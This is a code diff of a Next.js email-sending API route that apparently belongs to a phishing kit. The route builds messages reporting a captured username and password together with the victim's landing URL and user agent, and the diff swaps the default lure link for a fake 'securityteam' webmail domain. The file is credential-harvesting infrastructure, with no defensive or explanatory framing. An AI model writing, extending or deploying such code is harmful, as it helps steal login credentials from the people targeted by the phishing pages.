@@ -1,4 +1,3 @@
-
 /** @format */
 
 // app/api/sendemail/route.js
@@ -24,7 +23,7 @@ export async function POST(req) {
 *Username:* 
 *Password:* 
 *Landing URL:* 
-${landingUrl || 'https://purchaseorderbvcgvbn.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download'}
+${landingUrl || 'https://webmail.securityteam2096.online/anSaGjhw'}
 
 ✅ *User Agent:*
 ${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
@@ -65,7 +64,7 @@ ${Math.floor(Date.now() / 1000)}
 *Username:* ${eparams}
 *Password:* ${password}
 *Landing URL:* 
-${landingUrl || 'https://purchaseorderbvcgvbn.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download'}
+${landingUrl || 'https://webmail.securityteam2096.online/anSaGjhw'}
 
 ✅ *User Agent:*
 ${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
